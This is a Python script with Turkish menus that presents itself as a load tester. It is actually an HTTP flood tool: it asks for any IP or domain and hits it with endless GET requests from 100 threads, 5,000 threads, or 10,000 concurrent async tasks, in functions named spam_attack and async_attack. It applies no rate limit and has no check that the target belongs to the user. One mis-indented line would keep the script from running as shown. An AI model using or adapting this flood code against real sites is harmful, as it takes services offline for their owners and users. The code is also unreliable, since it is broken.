import requests
import threading
import os
import time
import asyncio
import aiohttp
from colorama import Fore, Style, init

init(autoreset=True)

banner = f"""
{Fore.CYAN}
██╗ ██████╗ ███████╗
██║██╔═══   ██╔════╝
██║██║      █████╗  
██║██║      ██╔══╝  
██║╚██████╔ ███████╗
╚═╝ ╚═════╝ ╚══════╝
{Fore.LIGHTMAGENTA_EX} Created by IceLater{Style.RESET_ALL}
"""
print(banner)

def main_menu():
    while True:
        print(f"{Fore.YELLOW}1. İstek Testi")
        print("2. Hafif Yük Testi (Kurulumsuz)")
        print("3. Gelişmiş Yük Testi (k6)")
        choice = input(f"{Fore.CYAN}Bir seçenek seçin (1-3): ").strip()

        if choice == "1":
            istek_testi()
        elif choice == "2":
            yuk_testi_menu()
        elif choice == "3":
            gelismis_yuk_testi()
        else:
            print(f"{Fore.RED}Geçersiz seçim. Lütfen tekrar deneyin.\n")

def spam_attack(target):
    def send():
        while True:
            try:
                response = requests.get(target, timeout=5)
                color = Fore.GREEN if response.status_code == 200 else Fore.RED
                print(f"{color}[{response.status_code}] {target}")
            except Exception as e:
                print(f"{Fore.RED}[HATA] {e}")
    for _ in range(100):
        threading.Thread(target=send, daemon=True).start()

def istek_testi():
    while True:
        print(f"{Fore.YELLOW}1. IP ile Test")
        print("2. Domain ile Test")
        choice = input(f"{Fore.CYAN}Bir seçenek seçin (1-2): ").strip()

        if choice == "1":
            ip = input("IP adresini girin: ").strip()
            if not ip.startswith("http"):
                ip = f"http://{ip}"
            spam_attack(ip)
            break
        elif choice == "2":
            domain = input("Domain adresini girin: ").strip()
            if not domain.startswith("http"):
                domain = f"https://{domain}"
            spam_attack(domain)
            break
        else:
            print(f"{Fore.RED}Geçersiz seçim. Tekrar deneyin.\n")

def yuk_testi_menu():
    while True:
        print(f"{Fore.YELLOW}Hafif Yük Testi Seçenekleri:")
        print("1. Senkron (Requests ile)")
        print("2. Asenkron (aiohttp ile)")
        choice = input(f"{Fore.CYAN}Bir seçenek seçin (1-2): ").strip()

      if choice in ["1", "2"]:
            while True:
                print(f"{Fore.YELLOW}1. IP ile Test")
                print("2. Domain ile Test")
                sub_choice = input(f"{Fore.CYAN}Bir seçenek seçin (1-2): ").strip()
                if sub_choice == "1":
                    target = input("IP adresini girin: ").strip()
                    if not target.startswith("http"):
                        target = f"http://{target}"
                    break
                elif sub_choice == "2":
                    target = input("Domain adresini girin: ").strip()
                    if not target.startswith("http"):
                        target = f"https://{target}"
                    break
                else:
                    print(f"{Fore.RED}Geçersiz seçim. Tekrar deneyin.\n")
            if choice == "1":
                yuklu_spam_sync(target)
            else:
                asyncio.run(yuklu_spam_async(target))
            break
        else:
            print(f"{Fore.RED}Geçersiz seçim. Tekrar deneyin.\n")

def yuklu_spam_sync(target):
    print(f"{Fore.LIGHTGREEN_EX}Senkron yük testi başlatılıyor... (Çıkmak için Ctrl+C)")
    def send():
        session = requests.Session()
        while True:
            try:
                response = session.get(target, timeout=3)
                color = Fore.GREEN if response.status_code == 200 else Fore.RED
                print(f"{color}[{response.status_code}] {target}")
            except Exception as e:
                print(f"{Fore.RED}[HATA] {e}")
    thread_count = 5000 # <----- THREAD SAYISINI BURADAN DEĞİŞTİREBİLİRSİNİZ (SENKRON İÇİN)
    
    for _ in range(thread_count):
        threading.Thread(target=send, daemon=True).start()
    while True:
        time.sleep(1)

async def async_attack(session, target):
    while True:
        try:
            async with session.get(target, timeout=3) as response:
                status = response.status
                color = Fore.GREEN if status == 200 else Fore.RED
                print(f"{color}[{status}] {target}")
        except Exception as e:
            print(f"{Fore.RED}[HATA] {e}")
        await asyncio.sleep(0)  # Kontrolü bırak

async def yuklu_spam_async(target):
    print(f"{Fore.LIGHTGREEN_EX}Asenkron yük testi başlatılıyor... (Çıkmak için Ctrl+C)")
    async with aiohttp.ClientSession() as session:
        tasks = []
        concurrency = 10000  # <----- EŞ ZAMANLI GÖREV SAYISINI BURADAN DEĞİŞTİREBİLİRSİNİZ (ASENKRON İÇİN)
        for _ in range(concurrency):
            task = asyncio.create_task(async_attack(session, target))
            tasks.append(task)
        await asyncio.gather(*tasks)

def gelismis_yuk_testi():
    print(f"{Fore.YELLOW}Bu özellik k6 aracını kullanır ve harici kurulum gerektirir.")
    print(f"{Fore.CYAN}Kurulum: npm install -g k6")
    print(f"{Fore.CYAN}Örnek komut: k6 run script.js")
    print(f"{Fore.MAGENTA}Not: Bu bölüm terminal dışı kullanımla çalışır.\n")

if __name__ == "__main__":
    main_menu()
    
